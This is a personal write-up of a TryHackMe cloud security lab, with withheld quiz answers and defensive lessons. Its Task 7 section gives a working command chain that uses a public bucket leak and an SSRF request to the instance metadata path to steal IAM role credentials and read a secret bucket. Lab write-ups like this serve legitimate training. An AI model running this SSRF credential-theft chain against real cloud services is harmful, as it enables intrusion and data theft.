# Cloud Security Fundamentals (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Specialized Domains. Premium room, cloud-agnostic. Difficulty:
  easy/medium (concept-heavy with one guided practical).
- **Date:** 2026-10-24.
- **Status:** SOLVED. All tasks answered; final flag `THM{…}` retrieved.
- **Lab (Task 7):** simulated cloud env `CloudSec-jr-V2` at `<ip>`. Object-storage sim on `:9000`,
  `ImageFetcher` web app (SSRF) on `:8080`. Driven **headless from the PC over the THM VPN** with `curl.exe`
  (run from `C:\CTF` per [[ctf-workspace-dir]]); no AttackBox/provider CLI needed.

## Concept answers (Tasks 2 to 6)

| Task | Question | Answer |
|---|---|---|
| 2 | Own web stack on a cloud VM, provider owns hardware -> service model | *(find it yourself)* |
| 2 | Always secures the physical datacentre + hardware | *(find it yourself)* |
| 3 | IAM statement field for allow vs deny | *(find it yourself)* |
| 3 | Named temporary bundle of permissions an identity can assume | *(find it yourself)* |
| 4 | `"Principal": "*"` makes a bucket... (one word) | *(find it yourself)* |
| 4 | Open-bucket artifact that holds the most in one file | *(find it yourself)* |
| 5 | CIDR that means the entire Internet | *(find it yourself)* |
| 5 | Two-word term: compromised instance -> another service, same perms | *(find it yourself)* |
| 6 | IMDS link-local IP (AWS/Azure) | `<ip>` |
| 6 | IMDS version answering a plain GET with no token (SSRF-able) | *(find it yourself)* |

## Practical (Task 7) - the SSRF-to-credentials chain

| Question | Answer |
|---|---|
| ImageFetcher web-app port | *(find it yourself)* |
| Public-bucket hint file | *(find it yourself)* |
| Resource type holding the full-access wildcard | *(find it yourself)* |
| Final flag | `THM{…}` |

### Chain (verified live, each step empirically)

```bash
IP=<ip>; TOK='X-Simulated-Token: <redacted-secret>'
nmap $IP                                   # 8080 (ImageFetcher), 9000 (object storage)
curl http://$IP:9000/                      # buckets: dev-assets/  prod-secrets/
curl http://$IP:9000/dev-assets/           # dev-notes.txt, welcome.txt  (dev-assets is public)
curl http://$IP:9000/dev-assets/dev-notes.txt   # leaks: ImageFetcher /fetch?url=, role = web-app-role
# SSRF: ImageFetcher fetches our URL server-side -> hit the metadata service
curl "http://$IP:8080/fetch?url=http://<ip>/latest/meta-data/iam/security-credentials/web-app-role"
#   -> JSON creds { AccessKeyId: <redacted-secret>, SecretAccessKey, Token, ... }
curl -H "$TOK" http://$IP:9000/admin/policy.json    # policy: Allow storage:* on bucket/prod-secrets/*
curl -H "$TOK" http://$IP:9000/prod-secrets/flag.txt  # -> THM{…}
```

`prod-secrets` was NOT listable anonymously (step 2 only exposed `dev-assets`); it opened only after the SSRF
handed over the `web-app-role` credentials whose `storage:*` policy covered that bucket.

## Lessons learned

- **The breach is the *chain*, not any one bug.** Five small, individually-survivable mistakes compose into
  full compromise: a public `dev-assets` bucket (hint + role name) -> an SSRF `/fetch?url=` primitive -> IMDSv1
  answering with no token -> role creds -> an over-permissive `storage:*` IAM policy -> the secret bucket.
  Fix any one link (lock the bucket, validate the fetch target, require IMDSv2, scope the policy) and the chain
  breaks. This is the real shape of cloud findings far more than memory corruption.
- **IMDS SSRF is the signature cloud move.** A server-side URL-fetch feature + `http://<ip>/latest/
  meta-data/iam/security-credentials/<role>` = temporary role credentials from outside the environment. The
  role name is itself discoverable (the parent path lists it; here it also leaked in `dev-notes.txt`). This is
  the Capital One 2019 pattern. **IMDSv1** (plain GET) is the vulnerable version; IMDSv2 requires a PUT-issued
  session token that defeats the naive payload.
- **Read a policy by Effect / Action / Resource, and hunt the wildcard.** `"Action": "storage:*"` (or `"*"`)
  and/or `"Resource": "*"` is the over-permissive tell. Over-permissive policy + exposed/reachable credentials
  is the one IAM pattern to remember.
- **Public object storage leaks the map, not just the loot.** The first readable bucket didn't hold the flag;
  it held a dev note naming the app, the SSRF endpoint, and the role. Recon value of a public bucket is often
  the hint it leaks toward the next step, not only its own contents. Backups are the highest-value single
  object when you do find data.
- **Shared Responsibility Model = the search map.** Provider always owns datacentre/hardware/hypervisor;
  customer always owns data + identities + access policies; the middle (OS, runtime, network config) shifts by
  service model (IaaS customer-heavy -> SaaS provider-heavy). Bugs cluster where the *customer* was supposed to
  act and didn't - exactly the five mistakes above.
- **Whole lab done headless with `curl.exe` from the PC** over the THM VPN - no AttackBox, no provider SDK. HTTP
  GETs + one header were the entire toolset.

## Related

- [[privesc-module-plan]] / [[ad-module-plan]] / [[metasploit-module-plan]] - other Jr Penetration Tester path
  modules. This is a Specialized Domains room on the same path.
- [[tryhackme-learning-buddy]] - study-buddy context. [[ctf-workspace-dir]] - ran `curl` from `C:\CTF`.
